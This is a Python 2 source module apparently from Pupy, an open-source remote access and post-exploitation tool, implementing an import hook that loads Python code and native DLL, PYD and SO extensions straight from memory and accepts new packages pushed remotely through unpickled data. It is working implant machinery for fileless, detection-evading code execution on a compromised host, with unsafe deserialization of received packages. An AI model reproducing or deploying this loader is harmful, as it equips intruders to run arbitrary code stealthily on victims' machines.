# -*- coding: utf-8 -*-
# ---------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
# ---------------------------------------------------------------
# This module uses the builtins modules pupy and _memimporter to load python modules and packages from memory, including .pyd files (windows only)
# Pupy can dynamically add new modules to the modules dictionary to allow remote importing of python modules from memory !
#
import sys, imp, zlib, marshal

__debug = False;

def dprint(msg):
    global __debug
    if __debug:
        print msg

try:
    import _memimporter
    builtin_memimporter = True
except ImportError:
    builtin_memimporter = False

modules={}
try:
    import pupy
    if not (hasattr(pupy, 'pseudo') and pupy.pseudo):
        modules = marshal.loads(zlib.decompress(pupy._get_compressed_library_string()))
except ImportError:
    pass

def get_module_files(fullname):
    """ return the file to load """
    global modules
    path = fullname.replace('.','/')

    return [
        module for module in modules.iterkeys() \
        if module.rsplit(".",1)[0] == path or any([
            path+'/__init__'+ext == module for ext in [
                '.py', '.pyc', '.pyo'
            ]
        ])
    ]

def pupy_add_package(pkdic):
    """ update the modules dictionary to allow remote imports of new packages """
    import cPickle
    global modules

    module = cPickle.loads(pkdic)

    if __debug:
        print 'Adding package: {}'.format([ x for x in module.iterkeys() ])

    modules.update(module)

class PupyPackageLoader:
    def __init__(self, fullname, contents, extension, is_pkg, path):
        self.fullname = fullname
        self.contents = contents
        self.extension = extension
        self.is_pkg=is_pkg
        self.path=path
        self.archive="" #need this attribute

    def load_module(self, fullname):
        imp.acquire_lock()
        try:
            dprint('loading module {}'.format(fullname))
            if fullname in sys.modules:
                return sys.modules[fullname]
            mod=None
            c=None
            if self.extension=="py":
                mod = imp.new_module(fullname)
                mod.__name__ = fullname
                mod.__file__ = '<memimport>/{}'.format(self.path)
                mod.__loader__ = self
                if self.is_pkg:
                    mod.__path__ = [mod.__file__.rsplit('/',1)[0]]
                    mod.__package__ = fullname
                else:
                    mod.__package__ = fullname.rsplit('.', 1)[0]
                sys.modules[fullname]=mod
                code = compile(self.contents, mod.__file__, "exec")
                exec code in mod.__dict__
            elif self.extension in ["pyc","pyo"]:
                mod = imp.new_module(fullname)
                mod.__name__ = fullname
                mod.__file__ = '<memimport>/{}'.format(self.path)
                mod.__loader__ = self
                if self.is_pkg:
                    mod.__path__ = [mod.__file__.rsplit('/',1)[0]]
                    mod.__package__ = fullname
                else:
                    mod.__package__ = fullname.rsplit('.', 1)[0]
                sys.modules[fullname]=mod
                c=marshal.loads(self.contents[8:])
                exec c in mod.__dict__
            elif self.extension in ("dll","pyd","so"):
                initname = "init" + fullname.rsplit(".",1)[-1]
                path=fullname.replace(".",'/')+"."+self.extension
                dprint('Loading {} from memory'.format(fullname))
                dprint('init:{}, {}.{}'.format(initname,fullname,self.extension))
                mod = _memimporter.import_module(self.contents, initname, fullname, path)
                mod.__name__=fullname
                mod.__file__ = '<memimport>/{}'.format(self.path)
                mod.__loader__ = self
                mod.__package__ = fullname.rsplit('.',1)[0]
                sys.modules[fullname]=mod
        except Exception as e:
            if fullname in sys.modules:
                del sys.modules[fullname]
            import traceback
            exc_type, exc_value, exc_traceback = sys.exc_info()
            traceback.print_tb(exc_traceback)
            dprint('PupyPackageLoader: '
                       'Error while loading package {} ({}) : {}'.format(
                           fullname, self.extension, str(e)))
            raise e
        finally:
            imp.release_lock()
        mod = sys.modules[fullname] # reread the module in case it changed itself
        return mod

class PupyPackageFinder:
    def __init__(self, modules):
        self.modules = modules
        self.modules_list=[
            x.rsplit(".",1)[0] for x in self.modules.iterkeys()
        ]

    def find_module(self, fullname, path=None):
        imp.acquire_lock()
        try:
            files=[]
            if fullname in ( 'pywintypes', 'pythoncom' ):
                fullname = fullname + "%d%d" % sys.version_info[:2]
                fullname = fullname.replace(".", '/') + ".dll"
                files = [ fullname ]
            else:
                files = get_module_files(fullname)

            dprint('find_module({},{}) in {})'.format(fullname, path, files))
            if not builtin_memimporter:
                files = [
                    f for f in files if not f.lower().endswith((".pyd",".dll",".so"))
                ]

            if not files:
                dprint('{} not found in {} - no files'.format(fullname,path))
                return None

            criterias = [
                lambda f: any([
                    f.endswith('/__init__'+ext) for ext in [
                        '.pyo', '.pyc', '.py'
                    ]
                ]),
                lambda f: any ([
                    f.endswith(ext) for ext in [
                        '.pyo', '.pyc'
                    ]
                ]),
                lambda f: any ([
                    f.endswith(ext) for ext in [
                        '.pyd', '.py', '.so', '.dll'
                    ]
                ]),
            ]

            selected = None
            for criteria in criterias:
                for pyfile in files:
                    if criteria(pyfile):
                        selected = pyfile
                        break

            if not selected:
                dprint('{} not found in {}: not in {} files'.format(
                    fullname, selected, len(files)))

            dprint('{} found in {}'.format(fullname, selected))
            content = self.modules[selected]
            extension = selected.rsplit(".",1)[1].strip().lower()
            is_pkg = any([selected.endswith('/__init__'+ext) for ext in [ '.pyo', '.pyc', '.py' ]])

            dprint('--> Loading {} ({}) package={}'.format(
                fullname, selected, is_pkg))
            return PupyPackageLoader(fullname, content, extension, is_pkg, selected)
        except Exception as e:
            raise e
        finally:
            imp.release_lock()

def load_pywintypes():
    #loading pywintypes27.dll :-)
    global modules
    try:
        import pupy
        pupy.load_dll("pywintypes27.dll", modules["pywintypes27.dll"])
    except Exception as e:
        dprint('Loading pywintypes27.dll.. failed: {}'.format(e))
        pass

def install(debug=False):
    global __debug
    __debug = debug
    sys.meta_path.append(PupyPackageFinder(modules))
    sys.path_importer_cache.clear()
    if 'win' in sys.platform:
        load_pywintypes()
    if __debug:
        print 'Bundled modules:'
        for module in modules.iterkeys():
            print '+ {}'.format(module)
